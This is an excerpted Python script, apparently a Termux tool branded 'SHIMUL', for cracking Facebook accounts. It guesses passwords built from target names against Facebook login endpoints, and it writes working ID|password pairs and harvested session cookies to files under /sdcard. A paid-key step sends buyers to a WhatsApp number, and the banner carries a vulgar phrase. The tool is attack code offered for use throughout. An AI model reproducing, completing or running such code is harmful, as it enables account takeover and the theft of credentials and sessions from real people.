...
try:
    os.makedirs('/sdcard/SHIMUL')
except:
    pass
sys.stdout.write('\x1b]2; SHIMUL\x07')
#<<_________[ LOGO ]_________>>#
logo=(f"""
 \033[1;37m[
  __  __ _____     _____ _    _ _  _   __  __ _    _ _      
  \033[1;37m|  \/  |  __ \   / ____| |  | | || | |  \/  | |  | | |
 \033[1;35m| \  / | |__) | | (___ | |__| | || |_| \  / | |  | | |
 \033[1;36m| |\/| |  _  /   \___ \|  __  |__   _| |\/| | |  | | |
 \033[1;37m | |  | | | \ \   ____) | |  | |  | | | |  | | |__| | |____ 
 \033[1;37m |_|  |_|_|  \_\ |_____/|_|  |_|  |_| |_|  |_|\____/|______  
\033[1;37m ================================================
    🤙\033[92;1mVALOBASAR MAIRA CHUDI🤙
\033[1;37m ================================================
 \033[1;97m[\033[1;92m•\033[1;97m] Owner    : MD SHIMUL
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : MRSH4MUL
...
def ffb(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write('\r [SHIMUL] %s | M1 OK/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r\033[1;92m [SHIMUL-OK] '+ids+' | '+pas+f'\033[1;97m')
                                        os.system('espeak -a 300 " Crack,   Successful,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        open('/sdcard/SHIMUL/SHIMUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/SHIMUL/SHIMUL-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        oks.append(ids);type(ids,pas,cookies)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r\r\033[1;91m [SHIMUL-CP] '+ids+' | '+pas+f'\033[1;97m')
                                        open(f'/sdcard/SHIMUL/SHIMUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:
                                        continue
...
def api(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write('\r [SHIMUL] %s | M2 OK/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
...
def api1(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write('\r [SHIMUL] %s | M3 OK/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
...
def subscription(message):
    ...
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mNote  \033[1;97m:  \033[1;92mWelcome To SHIMUL Tool")
    line()
    ...
    tsk = "Hello SHIMUL Sir ! I Need To Buy Your Premium Tools So Please Approve My Key-:)\n\nName: "+uname+" \nKey: "+key
    subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+8801830733258&text="+ tsk]);time.sleep(2)
    On()
def Off():
    clear()
